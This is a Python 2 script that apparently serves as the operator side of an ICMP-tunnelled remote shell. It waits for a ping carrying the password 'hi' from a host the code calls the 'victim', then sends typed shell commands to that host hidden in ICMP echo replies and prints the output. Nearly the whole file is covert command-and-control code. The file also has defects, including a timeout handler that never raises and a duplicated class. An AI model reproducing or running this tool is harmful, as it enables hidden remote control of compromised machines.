#!/usr/bin/env python
import socket
import struct
import os
import sys
import binascii
import zlib

import signal

class timeout:
    def __init__(self, seconds=1, error_message='Timeout'):
        self.seconds = seconds
        self.error_message = error_message
    def handle_timeout(self, signum, frame):
        TimeoutError(self.error_message)
    def __enter__(self):
        signal.signal(signal.SIGALRM, self.handle_timeout)
        signal.alarm(self.seconds)
    def __exit__(self, type, value, traceback):
        signal.alarm(0)

class TimeoutError(Exception):
    pass

###############################Socket Creation + Verify Our Client Through Wordpass################################
soc = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
type = 0
code = 0
check = 0
id = 1111
seq = 2222
while True:
	a, addr = soc.recvfrom(100)
	d = binascii.hexlify(a[9])
	dd = binascii.hexlify(a[20])
	dd2 = binascii.hexlify(a[21])
	if dd == "08" and d == "01" and dd2 == "00":
		print"got Ping Request, Check if its victim"
	q = struct.unpack("2s",a[28:30])
	if str(q[0]) == "hi":
		print "That's the word!"
		a = ' '
		break
	else:
		print "Not The Word"
		a = ' '

##############################Checksum Function + Verify ICMP Data From Our Client And Filter################
while True:
	ty = raw_input("type shell commands: ")
	print ty
	w = len(ty)
	tys = binascii.hexlify(ty)
	ll = tys
	if len(tys) == 0:
		ty = raw_input("type shell commands: ")
	if len(ty) == 0:
		ty = "ls"
	if len(ty) < 10:
		op = "0" + str(len(ty))
	else:
		print len(ty)
		op = str(len(ty))
	uy = op+ty


	def checksum(source_string):
	    	sum = 0
    		count_to = (len(source_string) / 2) * 2
    		count = 0
    		while count < count_to:
        		this_val = ord(source_string[count + 1])*256+ord(source_string[count])
        		sum = sum + this_val
        		sum = sum & 0xffffffff
        		count = count + 2
    		if count_to < len(source_string):
        		sum = sum + ord(source_string[len(source_string) - 1])
        		sum = sum & 0xffffffff
    		sum = (sum >> 16) + (sum & 0xffff)
    		sum = sum + (sum >> 16)
    		answer = ~sum
    		answer = answer & 0xffff
   		answer = answer >> 8 | (answer << 8 & 0xff00)
    		return answer


	def create_packet(id):
    		header = struct.pack('bbHHh', 0, 0, 0, id, 1)
    		data = uy

    		my_checksum = checksum(header + data)

    		header = struct.pack('bbHHh', 0, 0,
                         socket.htons(my_checksum), id, 1)
    		return header + data

	packet_id = 1515
	packet = create_packet(packet_id)
	while packet:
		sent = soc.sendto(packet, addr)
		packet = packet[sent:]
	bb = ' '
	with timeout(seconds=5):
		try:
			aa = soc.recv(10000)
			test = struct.unpack("2s",aa[28:30])
			if str(test[0]) == "hi":
				print "reconnected"
				continue
			else:
				pass
		except:
			continue
	print aa
	ll = 0
	tys = 0
	ty = 0
	w = 0
	num = ' '
	p1 = ' '
	aa = ' '
	bb = ' '
	if uy == str(w)+"exit":
		print str(w) + "exit"
		break



import signal

class timeout:
    def __init__(self, seconds=1, error_message='Timeout'):
        self.seconds = seconds
        self.error_message = error_message
    def handle_timeout(self, signum, frame):
        raise TimeoutError(self.error_message)
    def __enter__(self):
        signal.signal(signal.SIGALRM, self.handle_timeout)
        signal.alarm(self.seconds)
    def __exit__(self, type, value, traceback):
        signal.alarm(0)
